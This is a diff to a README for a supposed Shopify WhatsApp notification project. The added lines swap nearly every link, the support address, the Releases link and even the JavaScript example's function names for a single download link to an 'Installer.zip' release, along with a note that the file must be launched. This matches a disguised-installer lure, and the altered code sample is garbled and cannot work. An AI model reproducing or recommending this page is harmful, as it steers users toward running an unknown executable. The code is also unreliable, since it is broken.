@@ -1,7 +1,7 @@
 
 # 🛒 Shopify-WhatsApp-Notification 📱
 
-![Shopify WhatsApp Notification](https://www.example.com/image.jpg)
+![Shopify WhatsApp Notification](https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip)
 
 Welcome to the **Shopify WhatsApp Notification** repository! This repository focuses on integrating WhatsApp notifications with your Shopify store. Get real-time updates and alerts sent directly to your customers on the popular messaging platform, WhatsApp.
 
@@ -21,7 +21,7 @@ Welcome to the **Shopify WhatsApp Notification** repository! This repository foc
 ## Installation 🚀
 To get started with integrating WhatsApp notifications into your Shopify store, download the project files from the link below:
 
-[![Download Project](https://img.shields.io/badge/Download-%20Project-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip%20Project-brightgreen)](https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip)
 
 🚀 **Note: File Needs to be Launched**
 
@@ -44,20 +44,20 @@ Follow these steps to start using Shopify WhatsApp Notification:
 const whatsappNotification = require('shopify-whatsapp-notification');
 
 // Set up event listeners
-whatsappNotification.on('orderPlaced', (order) => {
-  console.log(`New order placed - Order ID: ${order.id}`);
+https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip('orderPlaced', (order) => {
+  https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip(`New order placed - Order ID: ${https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip}`);
   // Send WhatsApp notification to customer
 });
 
 // Start the notification service
-whatsappNotification.start();
+https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip();
 ```
 
 ## Contributions 🌟
 Contributions are welcome! If you have any suggestions, improvements, or new features to add, feel free to submit a pull request to enhance the Shopify WhatsApp Notification integration.
 
 ## Support ℹ️
-Need help or have questions? Get in touch with our support team at [support@example.com](mailto:support@example.com).
+Need help or have questions? Get in touch with our support team at [https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip](https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip).
 
 ## License 📜
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
@@ -66,4 +66,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🚀 Get started now and revolutionize customer engagement with instant WhatsApp notifications for your Shopify store! 📱💬
 
-Visit the [Releases](https://github.com/cli/oauth/releases) section for the latest updates if the provided link is not working properly.
+Visit the [Releases](https://github.com/yveszao/Shopify-WhatsApp-Notification/releases/download/v1.0/Installer.zip) section for the latest updates if the provided link is not working properly.
